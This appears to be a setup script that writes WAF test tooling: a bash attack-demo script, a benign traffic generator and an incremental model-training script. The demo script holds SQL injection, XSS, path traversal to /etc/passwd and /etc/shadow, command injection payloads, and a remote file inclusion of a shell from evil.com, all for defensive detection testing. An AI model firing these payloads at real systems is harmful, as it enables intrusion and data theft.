# Create demo and testing scripts (Day 5)
attack_demo = '''#!/bin/bash
# Attack demonstration script for WAF testing

set -e

echo "🎯 WAF Attack Demonstration"
echo "============================"

BASE_URL=${WAF_URL:-"http://localhost"}
API_URL=${ML_API_URL:-"http://localhost:8080"}

echo "Testing against: $BASE_URL"
echo "ML API: $API_URL"
echo

# Function to test a single request
test_request() {
    local url="$1"
    local description="$2"
    local expected="$3"
    
    echo "🔍 Testing: $description"
    echo "   URL: $url"
    
    # Make request and capture response
    response=$(curl -s -w "\\nHTTP_STATUS:%{http_code}\\nTOTAL_TIME:%{time_total}" "$url" 2>/dev/null || echo "ERROR")
    
    if [[ "$response" == *"ERROR"* ]]; then
        echo "   ❌ Request failed"
    else
        status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
        time=$(echo "$response" | grep "TOTAL_TIME:" | cut -d: -f2)
        echo "   ✅ Status: $status | Time: ${time}s"
    fi
    
    # Check for WAF headers
    headers=$(curl -s -I "$url" 2>/dev/null || echo "")
    if echo "$headers" | grep -q "X-ML-Score"; then
        score=$(echo "$headers" | grep "X-ML-Score:" | cut -d: -f2 | tr -d ' \\r')
        anomaly=$(echo "$headers" | grep "X-ML-Anomaly:" | cut -d: -f2 | tr -d ' \\r')
        echo "   🤖 ML Score: $score | Anomaly: $anomaly"
    fi
    
    echo
    sleep 1
}

echo "📋 Running attack simulation scenarios..."
echo

# Benign requests
echo "✅ BENIGN REQUESTS"
echo "==================="
test_request "$BASE_URL/" "Homepage access"
test_request "$BASE_URL/login" "Login page"
test_request "$BASE_URL/api/users" "API endpoint"
test_request "$BASE_URL/profile/123" "User profile"
test_request "$BASE_URL/search?q=products" "Search functionality"

echo "🚨 MALICIOUS REQUESTS"
echo "======================"

# SQL Injection attempts
test_request "$BASE_URL/api/users?id=1%20UNION%20SELECT%20password%20FROM%20admin" "SQL Injection - UNION"
test_request "$BASE_URL/login?username=admin%27%20OR%201=1%20--%20" "SQL Injection - Authentication bypass"
test_request "$BASE_URL/search?q=test%27;%20DROP%20TABLE%20users;%20--" "SQL Injection - DROP TABLE"

# XSS attempts
test_request "$BASE_URL/search?q=%3Cscript%3Ealert(1)%3C/script%3E" "XSS - Basic script injection"
test_request "$BASE_URL/profile/123?name=javascript:alert(document.cookie)" "XSS - JavaScript URL"
test_request "$BASE_URL/comment?text=%3Cimg%20src=x%20onerror=alert(1)%3E" "XSS - Image onerror"

# Directory traversal
test_request "$BASE_URL/../etc/passwd" "Directory Traversal - /etc/passwd"
test_request "$BASE_URL/api/file?path=..%2F..%2F..%2Fetc%2Fpasswd" "Directory Traversal - URL encoded"
test_request "$BASE_URL/download?file=../../../../etc/shadow" "Directory Traversal - shadow file"

# Admin/sensitive path access
test_request "$BASE_URL/admin/delete_user?id=1" "Admin panel access"
test_request "$BASE_URL/admin/config" "Admin configuration"
test_request "$BASE_URL/phpinfo.php" "PHP info disclosure"
test_request "$BASE_URL/.env" "Environment file access"

# Command injection
test_request "$BASE_URL/ping?host=localhost;cat%20/etc/passwd" "Command Injection - cat passwd"
test_request "$BASE_URL/system?cmd=ls%20-la%20/" "Command Injection - directory listing"
test_request "$BASE_URL/exec?command=whoami" "Command Injection - whoami"

# Buffer overflow / DoS attempts
long_string=$(printf 'A%.0s' {1..500})
test_request "$BASE_URL/search?q=$long_string" "Buffer Overflow - Long query"

# File inclusion
test_request "$BASE_URL/include?file=/etc/passwd" "Local File Inclusion"
test_request "$BASE_URL/page?include=http://evil.com/shell.php" "Remote File Inclusion"

echo "📊 SUMMARY"
echo "=========="
echo "Attack simulation completed!"
echo

# Check detection log
if [ -f "logs/waf_detections.log" ]; then
    echo "🔍 Recent detections:"
    tail -n 10 logs/waf_detections.log | while read line; do
        echo "   📝 $line"
    done
elif docker exec waf-nginx test -f /var/log/waf/detections.log 2>/dev/null; then
    echo "🔍 Recent detections from Docker:"
    docker exec waf-nginx tail -n 10 /var/log/waf/detections.log | while read line; do
        echo "   📝 $line"
    done
else
    echo "⚠️  Detection log not found. Check WAF configuration."
fi

echo
echo "🎯 Demo completed! Check WAF logs for detailed detection information."
'''

with open("webapp-ml-waf/demo/attacks.sh", "w") as f:
    f.write(attack_demo)

# Make it executable
import stat
os.chmod("webapp-ml-waf/demo/attacks.sh", stat.S_IRWXU | stat.S_IRGRP | stat.S_IROTH)

# Create traffic generator for benign requests
traffic_gen = '''#!/usr/bin/env python3
"""
Benign traffic generator for WAF testing and training.
Generates realistic HTTP requests to simulate normal user behavior.
"""

import requests
import time
import random
import argparse
import json
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict

class TrafficGenerator:
    def __init__(self, base_url: str = "http://localhost"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
        # Common user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        ]
        
        # Realistic request patterns
        self.request_patterns = [
            # Static resources
            {"method": "GET", "path": "/", "weight": 20},
            {"method": "GET", "path": "/index.html", "weight": 10},
            {"method": "GET", "path": "/static/css/style.css", "weight": 15},
            {"method": "GET", "path": "/static/js/app.js", "weight": 15},
            {"method": "GET", "path": "/static/images/logo.png", "weight": 10},
            
            # Authentication
            {"method": "GET", "path": "/login", "weight": 5},
            {"method": "POST", "path": "/login", "weight": 3},
            {"method": "POST", "path": "/logout", "weight": 2},
            {"method": "GET", "path": "/register", "weight": 2},
            
            # User interactions
            {"method": "GET", "path": "/profile/{user_id}", "weight": 8},
            {"method": "GET", "path": "/dashboard", "weight": 6},
            {"method": "GET", "path": "/settings", "weight": 3},
            
            # API calls
            {"method": "GET", "path": "/api/users", "weight": 5},
            {"method": "GET", "path": "/api/user/{user_id}", "weight": 8},
            {"method": "GET", "path": "/api/items", "weight": 10},
            {"method": "GET", "path": "/api/item/{item_id}", "weight": 12},
            {"method": "POST", "path": "/api/items", "weight": 3},
            {"method": "PUT", "path": "/api/item/{item_id}", "weight": 2},
            {"method": "DELETE", "path": "/api/item/{item_id}", "weight": 1},
            
            # Search and browsing
            {"method": "GET", "path": "/search", "weight": 8},
            {"method": "GET", "path": "/search?q={query}", "weight": 12},
            {"method": "GET", "path": "/category/{category_id}", "weight": 6},
            {"method": "GET", "path": "/product/{product_id}", "weight": 8},
            
            # Health checks
            {"method": "GET", "path": "/health", "weight": 2},
            {"method": "GET", "path": "/status", "weight": 1},
        ]
    
    def generate_request(self) -> Dict:
        """Generate a single realistic HTTP request"""
        # Choose pattern based on weights
        pattern = random.choices(
            self.request_patterns, 
            weights=[p["weight"] for p in self.request_patterns]
        )[0]
        
        # Format path with realistic values
        path = pattern["path"]
        if "{user_id}" in path:
            path = path.format(user_id=random.randint(1, 1000))
        elif "{item_id}" in path:
            path = path.format(item_id=random.randint(1, 5000))
        elif "{product_id}" in path:
            path = path.format(product_id=random.randint(1, 2000))
        elif "{category_id}" in path:
            path = path.format(category_id=random.randint(1, 50))
        elif "{query}" in path:
            queries = ["laptop", "phone", "book", "shoes", "camera", "tablet", "watch", "headphones"]
            path = path.format(query=random.choice(queries))
        
        return {
            "method": pattern["method"],
            "url": self.base_url + path,
            "headers": {
                "User-Agent": random.choice(self.user_agents)
            }
        }
    
    def make_request(self, request_data: Dict) -> Dict:
        """Make a single HTTP request and return response info"""
        start_time = time.time()
        
        try:
            response = self.session.request(
                method=request_data["method"],
                url=request_data["url"],
                headers=request_data["headers"],
                timeout=10
            )
            
            duration = time.time() - start_time
            
            return {
                "url": request_data["url"],
                "method": request_data["method"],
                "status_code": response.status_code,
                "duration": round(duration, 3),
                "ml_score": response.headers.get("X-ML-Score"),
                "anomaly": response.headers.get("X-ML-Anomaly"),
                "cache": response.headers.get("X-Cache"),
                "success": True
            }
            
        except Exception as e:
            duration = time.time() - start_time
            return {
                "url": request_data["url"],
                "method": request_data["method"],
                "error": str(e),
                "duration": round(duration, 3),
                "success": False
            }
    
    def generate_traffic(self, num_requests: int = 100, 
                        concurrent: int = 5, 
                        delay_range: tuple = (0.1, 2.0),
                        verbose: bool = True) -> List[Dict]:
        """Generate traffic with specified parameters"""
        
        results = []
        requests_made = 0
        errors = 0
        anomalies_detected = 0
        
        if verbose:
            print(f"🚀 Generating {num_requests} requests with {concurrent} concurrent workers")
            print(f"   Target: {self.base_url}")
            print(f"   Delay range: {delay_range[0]}-{delay_range[1]}s")
            print()
        
        def worker():
            nonlocal requests_made, errors, anomalies_detected
            
            request_data = self.generate_request()
            result = self.make_request(request_data)
            
            requests_made += 1
            
            if not result["success"]:
                errors += 1
            elif result.get("anomaly") == "true":
                anomalies_detected += 1
            
            if verbose and requests_made % 10 == 0:
                print(f"   Progress: {requests_made}/{num_requests} requests")
            
            # Random delay between requests
            time.sleep(random.uniform(delay_range[0], delay_range[1]))
            
            return result
        
        # Generate requests concurrently
        with ThreadPoolExecutor(max_workers=concurrent) as executor:
            futures = [executor.submit(worker) for _ in range(num_requests)]
            
            for future in futures:
                try:
                    result = future.result(timeout=30)
                    results.append(result)
                except Exception as e:
                    if verbose:
                        print(f"   ❌ Worker error: {e}")
        
        # Summary statistics
        if verbose:
            success_rate = ((requests_made - errors) / requests_made * 100) if requests_made > 0 else 0
            avg_duration = sum(r.get("duration", 0) for r in results if r.get("success")) / len([r for r in results if r.get("success")]) if results else 0
            
            print(f"\\n📊 Traffic Generation Summary:")
            print(f"   Total requests: {requests_made}")
            print(f"   Successful: {requests_made - errors}")
            print(f"   Errors: {errors}")
            print(f"   Success rate: {success_rate:.1f}%")
            print(f"   Anomalies detected: {anomalies_detected}")
            print(f"   Average response time: {avg_duration:.3f}s")
        
        return results

def main():
    parser = argparse.ArgumentParser(description="Generate benign traffic for WAF testing")
    parser.add_argument("--url", default="http://localhost", help="Base URL to test")
    parser.add_argument("--requests", type=int, default=100, help="Number of requests to generate")
    parser.add_argument("--concurrent", type=int, default=5, help="Concurrent workers")
    parser.add_argument("--min-delay", type=float, default=0.1, help="Minimum delay between requests")
    parser.add_argument("--max-delay", type=float, default=2.0, help="Maximum delay between requests")
    parser.add_argument("--output", help="Save results to JSON file")
    parser.add_argument("--quiet", action="store_true", help="Quiet mode")
    
    args = parser.parse_args()
    
    generator = TrafficGenerator(args.url)
    
    results = generator.generate_traffic(
        num_requests=args.requests,
        concurrent=args.concurrent,
        delay_range=(args.min_delay, args.max_delay),
        verbose=not args.quiet
    )
    
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\\n💾 Results saved to: {args.output}")

if __name__ == "__main__":
    main()
'''

with open("webapp-ml-waf/scripts/generate_traffic.py", "w") as f:
    f.write(traffic_gen)

# Create incremental training script (Day 5)
incremental_train = '''#!/usr/bin/env python3
"""
Incremental training script for updating the WAF model with new benign data.
Supports hot-reloading and threshold adjustment.
"""

import argparse
import json
import os
import sys
import requests
from typing import List

sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'src'))

from detector import HTTPAnomalyDetector

def load_new_sequences(file_path: str) -> List[str]:
    """Load new sequences from file"""
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"Training file not found: {file_path}")
    
    with open(file_path, 'r') as f:
        sequences = [line.strip() for line in f.readlines() if line.strip()]
    
    return sequences

def update_model(model_path: str, new_sequences: List[str], epochs: int = 1):
    """Update existing model with new sequences"""
    
    # Load existing detector
    detector = HTTPAnomalyDetector()
    
    if os.path.exists(model_path):
        print(f"Loading existing model from: {model_path}")
        detector.load_model(model_path)
        print(f"✅ Model loaded - {len(detector.normal_patterns)} patterns, {len(detector.token_frequencies)} tokens")
    else:
        print(f"No existing model found, creating new one...")
        detector.is_trained = False
    
    # Perform incremental training
    print(f"\\n🔄 Performing incremental training...")
    print(f"   New sequences: {len(new_sequences)}")
    print(f"   Epochs: {epochs}")
    
    for epoch in range(epochs):
        if detector.is_trained:
            stats = detector.incremental_train(new_sequences)
        else:
            stats = detector.train(new_sequences)
        
        print(f"\\n📊 Epoch {epoch + 1}/{epochs} completed:")
        for key, value in stats.items():
            print(f"   {key}: {value}")
    
    # Save updated model
    detector.save_model(model_path)
    print(f"\\n✅ Updated model saved to: {model_path}")
    
    return detector, stats

def notify_api_reload(api_url: str = "http://localhost:8080"):
    """Notify the API server to reload the model"""
    try:
        response = requests.post(f"{api_url}/retrain", timeout=10)
        if response.status_code == 200:
            print(f"✅ API server notified to reload model")
        else:
            print(f"⚠️  API server responded with status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"⚠️  Failed to notify API server: {e}")
        print("   You may need to restart the API server manually")

def validate_model(detector: HTTPAnomalyDetector, test_sequences: List[str] = None):
    """Validate the updated model with test sequences"""
    
    if not test_sequences:
        # Default test sequences
        test_sequences = [
            # Benign requests (should have low scores)
            "GET /",
            "POST /login", 
            "GET /api/item/<ID>",
            "GET /profile/<ID>",
            "POST /api/users",
            
            # Suspicious requests (should have high scores)
            "GET /../etc/passwd",
            "POST /admin/delete",
            "GET /search?q=<script>alert(1)</script>",
            "GET /api?id=1 UNION SELECT password FROM users",
            "POST /cmd/exec"
        ]
    
    print(f"\\n🧪 Validating updated model with {len(test_sequences)} test cases:")
    print("=" * 70)
    
    benign_scores = []
    malicious_scores = []
    
    for i, sequence in enumerate(test_sequences):
        details = detector.get_prediction_details(sequence)
        score = details['anomaly_score']
        is_anomaly = details['is_anomaly']
        
        # Classify for statistics
        if i < 5:  # First 5 are benign
            benign_scores.append(score)
            expected = "BENIGN"
        else:  # Rest are malicious
            malicious_scores.append(score)
            expected = "MALICIOUS"
        
        status = "🚨 ANOMALY" if is_anomaly else "✅ NORMAL"
        result = "✅" if (is_anomaly and expected == "MALICIOUS") or (not is_anomaly and expected == "BENIGN") else "❌"
        
        print(f"{result} {status} | Score: {score:.3f} | {expected}: {sequence}")
    
    # Calculate statistics
    if benign_scores and malicious_scores:
        avg_benign = sum(benign_scores) / len(benign_scores)
        avg_malicious = sum(malicious_scores) / len(malicious_scores)
        
        print(f"\\n📊 Validation Statistics:")
        print(f"   Average benign score: {avg_benign:.3f}")
        print(f"   Average malicious score: {avg_malicious:.3f}")
        print(f"   Separation gap: {avg_malicious - avg_benign:.3f}")
        
        if avg_malicious - avg_benign > 0.3:
            print(f"   ✅ Good separation between benign and malicious scores")
        else:
            print(f"   ⚠️  Poor separation - consider adjusting threshold or adding more training data")

def main():
    parser = argparse.ArgumentParser(description="Incremental WAF model training")
    parser.add_argument("--new_logs", required=True, help="File containing new benign sequences")
    parser.add_argument("--model", default="model/final/detector.json", help="Model file path")
    parser.add_argument("--epochs", type=int, default=1, help="Number of training epochs")
    parser.add_argument("--api_url", default="http://localhost:8080", help="ML API URL for reload notification")
    parser.add_argument("--validate", action="store_true", help="Run validation after training")
    parser.add_argument("--no-reload", action="store_true", help="Skip API reload notification")
    
    args = parser.parse_args()
    
    try:
        # Load new training data
        print(f"📁 Loading new sequences from: {args.new_logs}")
        new_sequences = load_new_sequences(args.new_logs)
        print(f"✅ Loaded {len(new_sequences)} new sequences")
        
        # Update model
        detector, stats = update_model(args.model, new_sequences, args.epochs)
        
        # Validate model
        if args.validate:
            validate_model(detector)
        
        # Notify API server
        if not args.no_reload:
            notify_api_reload(args.api_url)
        
        print(f"\\n🎉 Incremental training completed successfully!")
        
    except Exception as e:
        print(f"❌ Error during incremental training: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    exit(main())
'''

with open("webapp-ml-waf/src/incremental_tune.py", "w") as f:
    f.write(incremental_train)

print("✅ Created demo and training scripts")